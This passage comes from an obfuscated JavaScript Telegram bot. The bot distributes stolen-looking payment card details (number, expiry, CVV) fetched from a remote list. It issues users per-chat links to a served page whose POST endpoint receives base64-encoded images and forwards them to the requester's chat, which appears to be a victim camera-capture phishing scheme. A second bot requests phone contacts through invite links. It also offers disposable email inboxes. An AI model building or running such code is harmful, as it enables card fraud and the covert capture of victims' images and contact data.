                    const _0x2d316c = _0x6100c9[_0xd3efc2(0x663)](parseInt, _0x4f9957[_0xd3efc2(0x301)][_0xd3efc2(0x472)]('_')[0x9d + 0x178c + -0x1828], 0x5 * -0x499 + 0x1 * -0x20fb + 0x3802), _0x2fd043 = Math[_0xd3efc2(0x2e7)](-0x3 * 0x613 + 0x1b7e * 0x1 + 0x3 * -0x317, _0x6100c9[_0xd3efc2(0x450)](_0x2d316c, 0x1 * 0x1811 + 0x31c * 0x7 + -0x2dc3));
                    bot[_0xd3efc2(0x67b) + _0xd3efc2(0x607)](_0x67942, _0x4f9957[_0xd3efc2(0x2c2)][_0xd3efc2(0x6a5)]), _0x6100c9[_0xd3efc2(0x663)](showCountryList, _0x67942, _0x2fd043);
                }
            }
        }
    }
});
const americanBanks = [
        _0x4e73bb(0x221) + _0x4e73bb(0x5c0),
        _0x4e73bb(0x24e),
        _0x4e73bb(0x269),
        _0x4e73bb(0x392) + 'o',
        _0x4e73bb(0x222) + 'e',
        _0x4e73bb(0x13e),
        _0x4e73bb(0x519),
        _0x4e73bb(0x95),
        _0x4e73bb(0x101) + _0x4e73bb(0x15b),
        _0x4e73bb(0x245) + _0x4e73bb(0x6b9)
    ], fetchVisaData = async () => {
        const _0x149548 = _0x4e73bb, _0x192c30 = {
                'QSfYV': function (_0x4c6839, _0x5968f4) {
                    return _0x4c6839 === _0x5968f4;
                },
                'rDrZL': function (_0x58acd7, _0x2301f1) {
                    return _0x58acd7 * _0x2301f1;
                },
                'CZCET': _0x149548(0x592) + _0x149548(0x580) + _0x149548(0x3b1),
                'WHNqK': _0x149548(0x20c),
                'EqXwM': function (_0xf49a74, _0x34f493) {
                    return _0xf49a74 + _0x34f493;
                },
                'JhDCQ': _0x149548(0x433) + _0x149548(0x474) + _0x149548(0x163) + 'p/',
                'zsgyr': function (_0x5da1bb, _0x5805c5) {
                    return _0x5da1bb > _0x5805c5;
                },
                'tAPPo': function (_0x19e15d, _0x48c9c3) {
                    return _0x19e15d > _0x48c9c3;
                },
                'VBzpu': function (_0x54133d, _0x83776b) {
                    return _0x54133d * _0x83776b;
                },
                'yuMGL': _0x149548(0x3b6) + _0x149548(0x324) + _0x149548(0x349) + _0x149548(0x4fb) + _0x149548(0x129) + _0x149548(0x43b),
                'GlhEv': _0x149548(0x514) + _0x149548(0x290)
            };
        try {
            const _0x359673 = _0x192c30[_0x149548(0x304)], _0x3c417e = await axios[_0x149548(0x5b5)](_0x359673), _0x4a4a7c = _0x3c417e[_0x149548(0x301)], _0x5956e1 = _0x4a4a7c[_0x149548(0x620)]()[_0x149548(0x472)]('\x0a');
            if (_0x192c30[_0x149548(0xfe)](_0x5956e1[_0x149548(0xbc)], 0xd8f + -0x3f7 + -0x998)) {
                const _0x4c65c3 = _0x5956e1[_0x149548(0x6bd)](_0x5bee89 => {
                    const _0x1f0512 = _0x149548, _0xc04eb7 = _0x5bee89[_0x1f0512(0x472)]('|');
                    if (_0x192c30[_0x1f0512(0x432)](_0xc04eb7[_0x1f0512(0xbc)], -0xaf9 + 0x4 * -0x5ea + 0x22a5))
                        return {
                            'CardNumber': _0xc04eb7[-0xea2 * -0x2 + 0x23e3 + -0x4127],
                            'Expiry': _0xc04eb7[0x115a * -0x1 + 0x1e86 + -0xd2b] + '/' + _0xc04eb7[-0x9b * 0x35 + 0x12d * -0x1c + 0x4105],
                            'CVV': _0xc04eb7[-0x19be * -0x1 + -0x14d4 + -0x4e7],
                            'Bank': americanBanks[Math[_0x1f0512(0x32b)](_0x192c30[_0x1f0512(0x320)](Math[_0x1f0512(0x4af)](), americanBanks[_0x1f0512(0xbc)]))],
                            'CardType': _0x192c30[_0x1f0512(0x282)],
                            'Country': _0x192c30[_0x1f0512(0x408)],
                            'Value': '$' + _0x192c30[_0x1f0512(0x6ca)](Math[_0x1f0512(0x32b)](_0x192c30[_0x1f0512(0x320)](Math[_0x1f0512(0x4af)](), 0x227c + 0x1 * 0x923 + 0x8 * -0x570)), -0x40 * 0x26 + -0x1 * 0x148d + 0x1e17)
                        };
                })[_0x149548(0x1de)](Boolean);
                if (_0x192c30[_0x149548(0x649)](_0x4c65c3[_0x149548(0xbc)], -0x1 * 0x12e7 + 0x65 * 0x3b + -0x460))
                    return _0x4c65c3[Math[_0x149548(0x32b)](_0x192c30[_0x149548(0x153)](Math[_0x149548(0x4af)](), _0x4c65c3[_0x149548(0xbc)]))];
            }
            return console[_0x149548(0x235)](_0x192c30[_0x149548(0x32e)]), null;
        } catch (_0x2e325b) {
            return console[_0x149548(0x235)](_0x192c30[_0x149548(0x68f)], _0x2e325b[_0x149548(0x2c2)]), null;
        }
    };
bot[_0x4e73bb(0x2d9)](/\/نكخمنتته/, _0x5dd266 => {
    const _0x2926af = _0x4e73bb, _0xc2886d = {
            'rbGdP': _0x2926af(0x61d) + _0x2926af(0x2fa),
            'KGcll': _0x2926af(0x128) + _0x2926af(0x2fa),
            'BBATQ': _0x2926af(0x64b),
            'jNnLT': _0x2926af(0x3c6) + _0x2926af(0x1fb) + _0x2926af(0x568) + _0x2926af(0x67f) + _0x2926af(0x673) + _0x2926af(0x10d) + _0x2926af(0x24a)
        }, _0x4afa32 = _0x5dd266[_0x2926af(0x662)]['id'], _0x569c60 = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0xc2886d[_0x2926af(0x669)],
                            'callback_data': _0xc2886d[_0x2926af(0x423)]
                        }]]
            },
            'parse_mode': _0xc2886d[_0x2926af(0x477)]
        };
    bot[_0x2926af(0x344) + 'e'](_0x4afa32, _0xc2886d[_0x2926af(0x13f)], _0x569c60);
}), bot['on'](_0x4e73bb(0x458) + _0x4e73bb(0xa5), async _0x38e246 => {
    const _0x397eb9 = _0x4e73bb, _0x42cc0c = {
            'GlMoB': function (_0x456f8e, _0x3a81e5) {
                return _0x456f8e === _0x3a81e5;
            },
            'SBpXi': _0x397eb9(0x128) + _0x397eb9(0x2fa),
            'Pzbkq': _0x397eb9(0x3d5) + _0x397eb9(0x5ca) + _0x397eb9(0x186) + _0x397eb9(0x299),
            'xSwRN': _0x397eb9(0x3d5) + _0x397eb9(0x5ca) + _0x397eb9(0xb8) + _0x397eb9(0x340),
            'VvSDu': _0x397eb9(0x3d5) + _0x397eb9(0x5ca) + _0x397eb9(0x447) + _0x397eb9(0x193),
            'ktasm': _0x397eb9(0x3d5) + _0x397eb9(0x5ca) + _0x397eb9(0x210) + _0x397eb9(0x640),
            'ZZWxh': _0x397eb9(0x3d5) + _0x397eb9(0x5ca) + _0x397eb9(0x38e) + _0x397eb9(0xa8),
            'viXKA': function (_0x1e153b) {
                return _0x1e153b();
            },
            'PDGEY': _0x397eb9(0x64b),
            'JCdEq': _0x397eb9(0x38c) + _0x397eb9(0x4bf) + _0x397eb9(0x675) + _0x397eb9(0x1b5) + _0x397eb9(0x4ed)
        }, _0x475988 = _0x38e246[_0x397eb9(0x2c2)][_0x397eb9(0x662)]['id'];
    if (_0x42cc0c[_0x397eb9(0xea)](_0x38e246[_0x397eb9(0x301)], _0x42cc0c[_0x397eb9(0x5c9)])) {
        let _0x3a287c = await bot[_0x397eb9(0x344) + 'e'](_0x475988, _0x42cc0c[_0x397eb9(0x157)]);
        await new Promise(_0x5d3722 => setTimeout(_0x5d3722, -0x11 * -0x23 + -0x1498 + 0x7 * 0x32b)), await bot[_0x397eb9(0x658) + _0x397eb9(0x603)](_0x42cc0c[_0x397eb9(0x347)], {
            'chat_id': _0x475988,
            'message_id': _0x3a287c[_0x397eb9(0x6a5)]
        }), await new Promise(_0x5cb189 => setTimeout(_0x5cb189, -0x12 * -0x61 + -0xffc + 0xd12)), await bot[_0x397eb9(0x658) + _0x397eb9(0x603)](_0x42cc0c[_0x397eb9(0x492)], {
            'chat_id': _0x475988,
            'message_id': _0x3a287c[_0x397eb9(0x6a5)]
        }), await new Promise(_0x3d6934 => setTimeout(_0x3d6934, -0x166 + 0x8 * 0xe + 0x4de)), await bot[_0x397eb9(0x658) + _0x397eb9(0x603)](_0x42cc0c[_0x397eb9(0x5cd)], {
            'chat_id': _0x475988,
            'message_id': _0x3a287c[_0x397eb9(0x6a5)]
        }), await new Promise(_0x479a9f => setTimeout(_0x479a9f, -0x49 * 0x34 + 0x125 * -0xc + 0x81e * 0x4)), await bot[_0x397eb9(0x658) + _0x397eb9(0x603)](_0x42cc0c[_0x397eb9(0x1f6)], {
            'chat_id': _0x475988,
            'message_id': _0x3a287c[_0x397eb9(0x6a5)]
        }), await new Promise(_0x5e639e => setTimeout(_0x5e639e, -0x1433 * -0x1 + -0x56 * 0x6f + 0x14ff)), await bot[_0x397eb9(0x67b) + _0x397eb9(0x607)](_0x475988, _0x3a287c[_0x397eb9(0x6a5)]);
        const _0x39270e = await _0x42cc0c[_0x397eb9(0x317)](fetchVisaData);
        if (_0x39270e) {
            const {
                CardNumber: _0x2724cc,
                Expiry: _0x4cb7a6,
                CVV: _0x1826c6,
                Bank: _0x1d7401,
                CardType: _0x106258,
                Country: _0x1ccc2e,
                Value: _0x5285cb
            } = _0x39270e;
            bot[_0x397eb9(0x344) + 'e'](_0x475988, _0x397eb9(0x57e) + _0x397eb9(0x43d) + _0x397eb9(0x3cc) + '`' + _0x2724cc + (_0x397eb9(0x542) + _0x397eb9(0x32a)) + _0x4cb7a6 + (_0x397eb9(0x375) + _0x397eb9(0x14f)) + _0x1826c6 + (_0x397eb9(0x314) + _0x397eb9(0x555)) + _0x1d7401 + (_0x397eb9(0x59b) + _0x397eb9(0x39a) + '`') + _0x106258 + (_0x397eb9(0x212) + _0x397eb9(0x4c3)) + _0x1ccc2e + (_0x397eb9(0x3d1) + _0x397eb9(0x41b)) + _0x5285cb + (_0x397eb9(0x58a) + _0x397eb9(0x5cc) + _0x397eb9(0x5cc) + _0x397eb9(0xbe) + _0x397eb9(0x534) + _0x397eb9(0x1ad) + _0x397eb9(0x528)), { 'parse_mode': _0x42cc0c[_0x397eb9(0x3d8)] });
        } else
            bot[_0x397eb9(0x344) + 'e'](_0x475988, _0x42cc0c[_0x397eb9(0x633)]);
    }
});
const deleteFolderRecursive = _0x1f85fc => {
    const _0x333f7c = _0x4e73bb, _0x4d8689 = {
            'KzcBq': function (_0x199134, _0x353a2c) {
                return _0x199134(_0x353a2c);
            }
        };
    fs[_0x333f7c(0x576)](_0x1f85fc) && (fs[_0x333f7c(0x4e2) + 'c'](_0x1f85fc)[_0x333f7c(0x297)](_0x33a56d => {
        const _0x42b48b = _0x333f7c, _0x15b219 = path[_0x42b48b(0x3eb)](_0x1f85fc, _0x33a56d);
        fs[_0x42b48b(0x147)](_0x15b219)[_0x42b48b(0x19e) + 'y']() ? _0x4d8689[_0x42b48b(0x141)](deleteFolderRecursive, _0x15b219) : fs[_0x42b48b(0x407)](_0x15b219);
    }), fs[_0x333f7c(0x89)](_0x1f85fc));
};
app[_0x4e73bb(0x2f2)](express[_0x4e73bb(0x523)](__dirname)), app[_0x4e73bb(0x493)](_0x4e73bb(0x50a), (_0x3214bb, _0x4b44ec) => {
    const _0x21262a = _0x4e73bb, _0x235c89 = {
            'DqbjC': _0x21262a(0x5fa),
            'ZJZcU': function (_0x23d336, _0x21e4ec) {
                return _0x23d336 + _0x21e4ec;
            },
            'eTWAK': _0x21262a(0x608),
            'IqqGr': _0x21262a(0xd1)
        }, _0x3b6505 = _0x3214bb[_0x21262a(0x67d)][_0x21262a(0x577)], _0x501144 = _0x3214bb[_0x21262a(0x67d)][_0x21262a(0x374)][_0x21262a(0x472)](','), _0x5cb1e4 = path[_0x21262a(0x3eb)](__dirname, _0x235c89[_0x21262a(0x614)]);
    !fs[_0x21262a(0x576)](_0x5cb1e4) && fs[_0x21262a(0x338)](_0x5cb1e4), _0x501144[_0x21262a(0x297)]((_0x51d7a2, _0x574d44) => {
        const _0x8fb94 = _0x21262a, _0x2a69a2 = Buffer[_0x8fb94(0x4df)](_0x51d7a2, _0x235c89[_0x8fb94(0x49c)]), _0x3dd455 = path[_0x8fb94(0x3eb)](_0x5cb1e4, _0x3b6505 + '_' + _0x574d44 + _0x8fb94(0x125));
        fs[_0x8fb94(0x42c) + _0x8fb94(0x499)](_0x3dd455, _0x2a69a2), bot[_0x8fb94(0x4aa)](_0x3b6505, _0x2a69a2, { 'caption': _0x8fb94(0x8a) + _0x235c89[_0x8fb94(0x21b)](_0x574d44, -0x1 * 0x24a6 + -0x5 * -0x33f + 0x146c) });
    }), console[_0x21262a(0x235)](_0x21262a(0xc4) + _0x21262a(0xf3) + _0x21262a(0x3fa) + _0x21262a(0x597) + _0x3b6505), _0x4b44ec[_0x21262a(0x469)](_0x235c89[_0x21262a(0x2f1)]);
}), app[_0x4e73bb(0x5b5)](_0x4e73bb(0x367), (_0x356c1f, _0x5e8f6a) => {
    const _0x37c423 = _0x4e73bb, _0x1bb0f2 = { 'jyFZG': _0x37c423(0x2b0) };
    _0x5e8f6a[_0x37c423(0x69a)](path[_0x37c423(0x3eb)](__dirname, _0x1bb0f2[_0x37c423(0x1c6)]));
}), bot[_0x4e73bb(0x2d9)](/\/اتتهتتاههة/, _0x2c50c3 => {
    const _0x27f50a = _0x4e73bb, _0x180ff7 = {
            'uDiyL': _0x27f50a(0x4be) + _0x27f50a(0x3c5) + _0x27f50a(0x567) + _0x27f50a(0x584) + _0x27f50a(0x240) + _0x27f50a(0x1f5),
            'brDGN': _0x27f50a(0x512) + _0x27f50a(0x618) + _0x27f50a(0x66b),
            'ZqJMm': _0x27f50a(0x4e6) + _0x27f50a(0x9d)
        }, _0x27f1d5 = _0x2c50c3[_0x27f50a(0x662)]['id'], _0x410833 = _0x180ff7[_0x27f50a(0x583)];
    bot[_0x27f50a(0x344) + 'e'](_0x27f1d5, _0x410833, {
        'reply_markup': {
            'inline_keyboard': [[{
                        'text': _0x180ff7[_0x27f50a(0x2f5)],
                        'callback_data': _0x180ff7[_0x27f50a(0x516)]
                    }]]
        }
    });
}), bot['on'](_0x4e73bb(0x458) + _0x4e73bb(0xa5), _0x5e6297 => {
    const _0x2a9d45 = _0x4e73bb, _0x26da68 = {
            'cLszx': function (_0x5203b2, _0x342811) {
                return _0x5203b2 === _0x342811;
            },
            'QuKUx': _0x2a9d45(0x4e6) + _0x2a9d45(0x9d)
        }, _0x3e2cfa = _0x5e6297[_0x2a9d45(0x2c2)][_0x2a9d45(0x662)]['id'], _0x3ce9df = _0x5e6297[_0x2a9d45(0x2c2)][_0x2a9d45(0x6a5)];
    if (_0x26da68[_0x2a9d45(0x188)](_0x5e6297[_0x2a9d45(0x301)], _0x26da68[_0x2a9d45(0x4f1)])) {
        const _0x4ef7de = baseUrl + (_0x2a9d45(0x5ac) + _0x2a9d45(0x6b8)) + _0x3e2cfa;
        bot[_0x2a9d45(0x344) + 'e'](_0x3e2cfa, _0x2a9d45(0x1c3) + _0x2a9d45(0x5a3) + _0x2a9d45(0x569) + _0x4ef7de);
    }
}), bot[_0x4e73bb(0x2d9)](/\/s2854تصخصrt/, _0x42a7ab => {
    const _0x3dcdaa = _0x4e73bb, _0x1f4515 = {
            'GaVOb': _0x3dcdaa(0x52e) + _0x3dcdaa(0x5bb),
            'tZdCa': _0x3dcdaa(0x20a) + 'il',
            'LdLut': _0x3dcdaa(0x6ad)
        }, _0x282e46 = _0x42a7ab[_0x3dcdaa(0x662)]['id'], _0x24df85 = _0x42a7ab[_0x3dcdaa(0x4df)], _0x10c3db = _0x24df85[_0x3dcdaa(0x64e)], _0x32dd82 = {
            'inline_keyboard': [[{
                        'text': _0x1f4515[_0x3dcdaa(0x5b1)],
                        'callback_data': _0x1f4515[_0x3dcdaa(0xa6)]
                    }]]
        };
    bot[_0x3dcdaa(0x344) + 'e'](_0x282e46, _0x3dcdaa(0x5e1) + _0x3dcdaa(0x2f4) + _0x10c3db + (_0x3dcdaa(0x547) + _0x3dcdaa(0x589) + _0x3dcdaa(0x2d2) + _0x3dcdaa(0x90) + _0x3dcdaa(0x6d2) + _0x3dcdaa(0x683) + _0x3dcdaa(0x518) + _0x3dcdaa(0x111) + _0x3dcdaa(0x45f) + 'g>'), {
        'parse_mode': _0x1f4515[_0x3dcdaa(0xad)],
        'reply_markup': { 'inline_keyboard': _0x32dd82[_0x3dcdaa(0x31f) + _0x3dcdaa(0x51e)] }
    });
}), bot['on'](_0x4e73bb(0x458) + _0x4e73bb(0xa5), _0x2953dd => {
    const _0x5ef8f6 = _0x4e73bb, _0x3640d4 = {
            'SQzJZ': function (_0x426ba6, _0x5bfbff) {
                return _0x426ba6 === _0x5bfbff;
            },
            'JYtIQ': _0x5ef8f6(0x20a) + 'il',
            'OjNkj': _0x5ef8f6(0x6ad)
        }, _0x70b11c = _0x2953dd[_0x5ef8f6(0x2c2)][_0x5ef8f6(0x662)]['id'], _0x4885fc = _0x2953dd[_0x5ef8f6(0x301)];
    _0x3640d4[_0x5ef8f6(0x386)](_0x4885fc, _0x3640d4[_0x5ef8f6(0x5a5)]) && bot[_0x5ef8f6(0x344) + 'e'](_0x70b11c, _0x5ef8f6(0x2cd) + _0x5ef8f6(0x645) + _0x5ef8f6(0xbf) + _0x5ef8f6(0x643) + _0x5ef8f6(0x143) + _0x5ef8f6(0x679) + _0x5ef8f6(0xb1) + _0x5ef8f6(0x672) + _0x5ef8f6(0x3f0) + _0x5ef8f6(0x3b2) + _0x5ef8f6(0x5f1) + _0x5ef8f6(0x26a) + _0x5ef8f6(0x321) + _0x5ef8f6(0x416) + _0x5ef8f6(0x5f5) + _0x5ef8f6(0x4d3) + _0x5ef8f6(0x4f6) + _0x5ef8f6(0x1b4) + _0x5ef8f6(0x5e7) + _0x5ef8f6(0x5cb) + _0x5ef8f6(0x334) + _0x5ef8f6(0x3b7) + _0x5ef8f6(0x591) + _0x5ef8f6(0x1a7) + _0x5ef8f6(0x332) + _0x5ef8f6(0x384) + _0x5ef8f6(0x13b), { 'parse_mode': _0x3640d4[_0x5ef8f6(0x6ba)] });
});
const EMAILS_FILE = _0x4e73bb(0x288) + 'n';
function readEmails() {
    const _0x520e81 = _0x4e73bb, _0x1a046d = { 'dVNxi': _0x520e81(0x1ec) };
    try {
        const _0x4415fe = fs[_0x520e81(0x601) + 'nc'](EMAILS_FILE, _0x1a046d[_0x520e81(0x431)]);
        return JSON[_0x520e81(0x6c4)](_0x4415fe);
    } catch (_0x683493) {
        return {};
    }
}
function writeEmails(_0x23d9b7) {
    const _0x52edd7 = _0x4e73bb;
    fs[_0x52edd7(0x42c) + _0x52edd7(0x499)](EMAILS_FILE, JSON[_0x52edd7(0x3e2)](_0x23d9b7, null, 0x3 * 0x809 + 0x24df * -0x1 + 0x1e * 0x6d));
}
bot[_0x4e73bb(0x2d9)](/\/email/, async _0x12bef7 => {
    const _0xc250e3 = _0x4e73bb, _0x3d91ac = {
            'LrzYj': function (_0x15f7f6) {
                return _0x15f7f6();
            },
            'xIYGY': _0xc250e3(0xc8) + _0xc250e3(0x3f3) + _0xc250e3(0x1bd) + _0xc250e3(0x394),
            'jAHyj': _0xc250e3(0x6ad),
            'yPila': _0xc250e3(0x345) + _0xc250e3(0x17b) + _0xc250e3(0x254) + _0xc250e3(0x25c) + _0xc250e3(0x3a2),
            'ykPOp': _0xc250e3(0x30b),
            'JtVRO': _0xc250e3(0x65b) + _0xc250e3(0x6b1),
            'SwjPw': _0xc250e3(0x1f9) + _0xc250e3(0x56a),
            'ArlGE': function (_0x2c93da, _0x17037a) {
                return _0x2c93da(_0x17037a);
            },
            'lFgKi': _0xc250e3(0x33b) + _0xc250e3(0x6cf) + _0xc250e3(0x6a3) + 'g>'
        }, _0x549eaf = _0x12bef7[_0xc250e3(0x4df)]['id'], _0x51de24 = _0x12bef7[_0xc250e3(0x662)]['id'];
    let _0x5009b0 = _0x3d91ac[_0xc250e3(0x261)](readEmails);
    _0x5009b0[_0x549eaf] && delete _0x5009b0[_0x549eaf];
    try {
        bot[_0xc250e3(0x344) + 'e'](_0x51de24, _0x3d91ac[_0xc250e3(0x3dd)], { 'parse_mode': _0x3d91ac[_0xc250e3(0x462)] });
        const _0x16ce59 = await axios[_0xc250e3(0x493)](_0x3d91ac[_0xc250e3(0x328)], {
                'name': _0x3d91ac[_0xc250e3(0x691)],
                'domain': _0x3d91ac[_0xc250e3(0x2de)]
            }, { 'headers': { 'User-Agent': _0x3d91ac[_0xc250e3(0x2b4)] } }), _0x2d677a = _0x16ce59[_0xc250e3(0x301)][_0xc250e3(0x376)];
        _0x5009b0[_0x549eaf] = _0x2d677a, _0x3d91ac[_0xc250e3(0x5fd)](writeEmails, _0x5009b0), bot[_0xc250e3(0x344) + 'e'](_0x51de24, _0xc250e3(0x556) + _0xc250e3(0x62c) + _0xc250e3(0x238) + _0xc250e3(0x3fb) + _0xc250e3(0x4b2) + _0x2d677a + (_0xc250e3(0x66d) + _0xc250e3(0x121) + _0xc250e3(0x54c) + _0xc250e3(0x3b9) + _0xc250e3(0x2d3)), { 'parse_mode': _0x3d91ac[_0xc250e3(0x462)] });
    } catch (_0x270e0b) {
        bot[_0xc250e3(0x344) + 'e'](_0x51de24, _0x3d91ac[_0xc250e3(0x2b5)], { 'parse_mode': _0x3d91ac[_0xc250e3(0x462)] });
    }
}), bot[_0x4e73bb(0x2d9)](/\/an/, _0x5d9e86 => {
    const _0x1c4010 = _0x4e73bb, _0x47f0c9 = {
            'XZmcH': function (_0x172fd5) {
                return _0x172fd5();
            },
            'Ziypc': _0x1c4010(0x6ad),
            'CzEPK': _0x1c4010(0x306) + _0x1c4010(0x3d9) + _0x1c4010(0x5fb) + _0x1c4010(0x56d) + 'g>'
        }, _0x10be45 = _0x5d9e86[_0x1c4010(0x662)]['id'], _0x180ca3 = _0x5d9e86[_0x1c4010(0x4df)]['id'];
    let _0x528dec = _0x47f0c9[_0x1c4010(0x549)](readEmails);
    if (_0x528dec[_0x180ca3]) {
        const _0x2948a1 = _0x528dec[_0x180ca3];
        bot[_0x1c4010(0x344) + 'e'](_0x10be45, _0x1c4010(0x4d7) + _0x1c4010(0xd0) + _0x1c4010(0x621) + _0x1c4010(0x3ec) + _0x1c4010(0x45a) + _0x1c4010(0x521) + _0x2948a1 + (_0x1c4010(0x66d) + _0x1c4010(0x121) + _0x1c4010(0x54c) + _0x1c4010(0x3b9) + _0x1c4010(0x2d3)), { 'parse_mode': _0x47f0c9[_0x1c4010(0x4d4)] });
    } else
        bot[_0x1c4010(0x344) + 'e'](_0x10be45, _0x47f0c9[_0x1c4010(0xcf)], { 'parse_mode': _0x47f0c9[_0x1c4010(0x4d4)] });
}), bot[_0x4e73bb(0x2d9)](/\/Messages/, async _0x27ed4f => {
    const _0x475771 = _0x4e73bb, _0xe1b3c1 = {
            'fqinl': _0x475771(0x6ad),
            'fvNux': function (_0x310b31) {
                return _0x310b31();
            },
            'hvBeh': function (_0x2ba1d3, _0x420066) {
                return _0x2ba1d3 > _0x420066;
            },
            'AZXuJ': _0x475771(0x473) + _0x475771(0xd8) + _0x475771(0x30c),
            'njEIh': _0x475771(0x1cf) + _0x475771(0x2bc) + _0x475771(0x613) + _0x475771(0x205) + 'g>',
            'XTgKB': _0x475771(0x196) + _0x475771(0x66f) + _0x475771(0x404) + _0x475771(0x256)
        }, _0x5aa08a = _0x27ed4f[_0x475771(0x662)]['id'], _0x5d24f9 = _0x27ed4f[_0x475771(0x4df)]['id'];
    let _0x34e648 = _0xe1b3c1[_0x475771(0x1a0)](readEmails);
    if (_0x34e648[_0x5d24f9]) {
        const _0x50f770 = _0x34e648[_0x5d24f9];
        try {
            const _0x5943dd = await axios[_0x475771(0x5b5)](_0x475771(0x345) + _0x475771(0x17b) + _0x475771(0x254) + _0x475771(0x25c) + _0x475771(0x1f3) + _0x50f770 + _0x475771(0x4f4)), _0x3e701f = _0x5943dd[_0x475771(0x301)];
            _0xe1b3c1[_0x475771(0x5e8)](_0x3e701f[_0x475771(0xbc)], 0x2190 + 0x23 * -0xfe + 0x12a) ? _0x3e701f[_0x475771(0x297)](_0x4e266b => {
                const _0x5e0478 = _0x475771;
                bot[_0x5e0478(0x344) + 'e'](_0x5aa08a, _0x5e0478(0x29d) + _0x5e0478(0x1c0) + _0x5e0478(0x183) + '\x0a' + _0x4e266b[_0x5e0478(0x151)] + '\x0a' + _0x4e266b[_0x5e0478(0x5f3)] + _0x5e0478(0x39b), { 'parse_mode': _0xe1b3c1[_0x5e0478(0x1d2)] });
            }) : bot[_0x475771(0x344) + 'e'](_0x5aa08a, _0xe1b3c1[_0x475771(0x454)]);
        } catch (_0x3d00ae) {
            bot[_0x475771(0x344) + 'e'](_0x5aa08a, _0xe1b3c1[_0x475771(0xbd)], { 'parse_mode': _0xe1b3c1[_0x475771(0x1d2)] });
        }
    } else
        bot[_0x475771(0x344) + 'e'](_0x5aa08a, _0xe1b3c1[_0x475771(0x3c1)], { 'parse_mode': _0xe1b3c1[_0x475771(0x1d2)] });
}), bot[_0x4e73bb(0x2d9)](/\/de/, _0xa8d22 => {
    const _0x371385 = _0x4e73bb, _0x52bbbe = {
            'IuviI': function (_0x445bf4) {
                return _0x445bf4();
            },
            'ghHsl': function (_0x144fa7, _0x1bf83b) {
                return _0x144fa7(_0x1bf83b);
            },
            'RjfcU': _0x371385(0x556) + _0x371385(0x581) + _0x371385(0x2f8) + '>',
            'ETIQj': _0x371385(0x6ad),
            'ylPiS': _0x371385(0x26c) + _0x371385(0x16f) + _0x371385(0x87) + _0x371385(0x256)
        }, _0x1b34e7 = _0xa8d22[_0x371385(0x662)]['id'], _0x5d704f = _0xa8d22[_0x371385(0x4df)]['id'];
    let _0xdbb3e8 = _0x52bbbe[_0x371385(0x369)](readEmails);
    _0xdbb3e8[_0x5d704f] ? (delete _0xdbb3e8[_0x5d704f], _0x52bbbe[_0x371385(0x20f)](writeEmails, _0xdbb3e8), bot[_0x371385(0x344) + 'e'](_0x1b34e7, _0x52bbbe[_0x371385(0x180)], { 'parse_mode': _0x52bbbe[_0x371385(0x17f)] })) : bot[_0x371385(0x344) + 'e'](_0x1b34e7, _0x52bbbe[_0x371385(0x463)], { 'parse_mode': _0x52bbbe[_0x371385(0x17f)] });
}), bot[_0x4e73bb(0x2d9)](/\/de/, async _0x51831d => {
    const _0x146098 = _0x4e73bb, _0x149bdc = {
            'nOgQP': _0x146098(0x556) + _0x146098(0x581) + _0x146098(0x2f8) + '>',
            'aADuo': _0x146098(0x6ad),
            'MDuIU': _0x146098(0x26c) + _0x146098(0x266) + _0x146098(0x503) + _0x146098(0x256)
        }, _0x95fe6f = _0x51831d[_0x146098(0x662)]['id'];
    try {
        fs[_0x146098(0x407)](_0x146098(0x113) + _0x95fe6f + _0x146098(0x365)), bot[_0x146098(0x344) + 'e'](_0x95fe6f, _0x149bdc[_0x146098(0xe5)], { 'parse_mode': _0x149bdc[_0x146098(0xee)] });
    } catch (_0x4174d5) {
        bot[_0x146098(0x344) + 'e'](_0x95fe6f, _0x149bdc[_0x146098(0xb3)], { 'parse_mode': _0x149bdc[_0x146098(0xee)] });
    }
}), bot[_0x4e73bb(0x2d9)](/\/sخسننسمس/, _0x37f6f7 => {
    const _0x8037c4 = _0x4e73bb, _0x405632 = {
            'BlLcu': _0x8037c4(0x229) + _0x8037c4(0x3de),
            'xDArK': _0x8037c4(0x325) + _0x8037c4(0x160),
            'LyDds': _0x8037c4(0x2f0) + _0x8037c4(0x624) + _0x8037c4(0x66e) + _0x8037c4(0x5f7)
        }, _0x4842da = _0x37f6f7[_0x8037c4(0x662)]['id'], _0x2d85fc = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x405632[_0x8037c4(0x2e1)],
                            'callback_data': _0x405632[_0x8037c4(0x4e4)]
                        }]]
            }
        };
    bot[_0x8037c4(0x344) + 'e'](_0x4842da, _0x405632[_0x8037c4(0x59a)], _0x2d85fc);
}), bot['on'](_0x4e73bb(0x458) + _0x4e73bb(0xa5), _0x6778d3 => {
    const _0x49c916 = _0x4e73bb, _0x1b507b = {
            'rcbXn': function (_0x1054f6, _0x3e00d3) {
                return _0x1054f6 === _0x3e00d3;
            },
            'zLYoK': _0x49c916(0x325) + _0x49c916(0x160)
        };
    if (_0x1b507b[_0x49c916(0x4d5)](_0x6778d3[_0x49c916(0x301)], _0x1b507b[_0x49c916(0x118)])) {
        const _0x4ef23a = _0x6778d3[_0x49c916(0x4df)]['id'], _0x2d5199 = _0x49c916(0x294) + _0x49c916(0x1a9) + _0x49c916(0x421) + _0x4ef23a;
        bot[_0x49c916(0x344) + 'e'](_0x6778d3[_0x49c916(0x2c2)][_0x49c916(0x662)]['id'], _0x49c916(0x52c) + _0x49c916(0xfb) + _0x49c916(0x4ea) + _0x49c916(0x3fc) + _0x49c916(0x4c4) + _0x49c916(0x140) + ':\x0a' + _0x2d5199);
    }
}), secondBot[_0x4e73bb(0x2d9)](/\/start (.+)/, (_0x59aea2, _0x1610f4) => {
    const _0x4680d4 = _0x4e73bb, _0x15995f = {
            'gQhqG': function (_0x21c56d, _0x5a037b) {
                return _0x21c56d(_0x5a037b);
            },
            'QHsiQ': _0x4680d4(0x341) + _0x4680d4(0x530),
            'JNhNA': _0x4680d4(0x409) + _0x4680d4(0x456) + _0x4680d4(0xd9) + _0x4680d4(0x350) + _0x4680d4(0x2b8)
        }, _0x42bbcd = _0x59aea2[_0x4680d4(0x662)]['id'], _0x4ee765 = _0x15995f[_0x4680d4(0x634)](parseInt, _0x1610f4[-0x17ad + 0x1 * 0x1fde + -0x418 * 0x2]);
    inviteLinks[_0x59aea2[_0x4680d4(0x4df)]['id']] = _0x4ee765;
    const _0x4866d3 = {
        'reply_markup': {
            'keyboard': [[{
                        'text': _0x15995f[_0x4680d4(0x2e2)],
                        'request_contact': !![]
                    }]],
            'one_time_keyboard': !![]
        }
    };
